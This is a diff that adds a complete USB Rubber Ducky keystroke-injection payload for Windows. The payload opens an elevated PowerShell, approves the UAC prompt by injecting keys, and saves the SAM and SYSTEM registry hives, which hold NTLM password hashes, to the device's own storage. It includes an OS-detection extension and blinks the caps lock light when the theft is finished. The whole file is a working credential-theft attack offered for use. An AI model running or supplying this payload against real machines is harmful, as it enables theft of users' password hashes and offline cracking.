@@ -1,0 +1,81 @@
+REM_BLOCK
+TITLE           Exfiltrate NTLM Hash Files onto Ducky Storage
+AUTHOR          Luu176
+DESCRIPTION     This payload exfiltrates NTLM hash files (which contain hashed passwords for users 
+                on the current Windows device) to the Rubber Ducky's SD card for further analysis. 
+                It utilizes PowerShell commands to locate and save NTLM files (SAM and SYSTEM) to 
+                the defined storage drive on the Ducky device.
+END_REM
+
+DEFINE #driveLabel DUCKY
+REM below you can set the number of blinks for the caps lock when finished (default 9)
+DEFINE #numBlinks 9
+
+ATTACKMODE HID STORAGE
+
+EXTENSION PASSIVE_WINDOWS_DETECT
+    REM VERSION 1.1
+    REM AUTHOR: Korben
+
+    REM_BLOCK DOCUMENTATION
+        Windows fully passive OS Detection and passive Detect Ready
+        Includes its own passive detect ready.
+        Does not require additional extensions.
+
+        USAGE:
+            Extension runs inline (here)
+            Place at beginning of payload (besides ATTACKMODE) to act as dynamic
+            boot delay
+            $_OS will be set to WINDOWS or NOT_WINDOWS
+            See end of payload for usage within payload
+    END_REM
+
+    REM CONFIGURATION:
+    DEFINE #MAX_WAIT 150
+    DEFINE #CHECK_INTERVAL 20
+    DEFINE #WINDOWS_HOST_REQUEST_COUNT 2
+    DEFINE #NOT_WINDOWS 7
+
+    $_OS = #NOT_WINDOWS
+
+    VAR $MAX_TRIES = #MAX_WAIT
+    WHILE(($_RECEIVED_HOST_LOCK_LED_REPLY == FALSE) && ($MAX_TRIES > 0))
+        DELAY #CHECK_INTERVAL
+        $MAX_TRIES = ($MAX_TRIES - 1)
+    END_WHILE
+    IF ($_HOST_CONFIGURATION_REQUEST_COUNT > #WINDOWS_HOST_REQUEST_COUNT) THEN
+        $_OS = WINDOWS
+    END_IF
+
+    REM_BLOCK EXAMPLE USAGE AFTER EXTENSION
+        IF ($_OS == WINDOWS) THEN
+            STRING HELLO WINDOWS!
+        ELSE
+            STRING HELLO WORLD!
+        END_IF
+    END_REM
+END_EXTENSION
+
+SAVE_HOST_KEYBOARD_LOCK_STATE
+IF ($_CAPSLOCK_ON == TRUE)
+    CAPSLOCK
+END_IF
+GUI d
+DELAY 1000
+GUI r
+DELAY 500
+STRINGLN powershell Start-Process powershell -Verb runAs
+DELAY 800
+ALT y
+DELAY 800
+STRINGLN cd (gwmi win32_volume -f 'label=''#driveLabel''').Name;reg save hklm\sam SAM;reg save hklm\system SYS;(New-Object -ComObject wscript.shell).SendKeys('{CAPSLOCK}');exit
+GUI d
+WAIT_FOR_CAPS_ON 
+REM once finished downloading SAM and SYSTEM, caps lock LED turn on and then flash (note: may take a couple minutes max to download)
+VAR $i = 0
+WHILE ( $i < #numBlinks )
+    DELAY 150
+    CAPSLOCK
+    $i = ( $i + 1 )
+END_WHILE
+RESTORE_HOST_KEYBOARD_LOCK_STATE
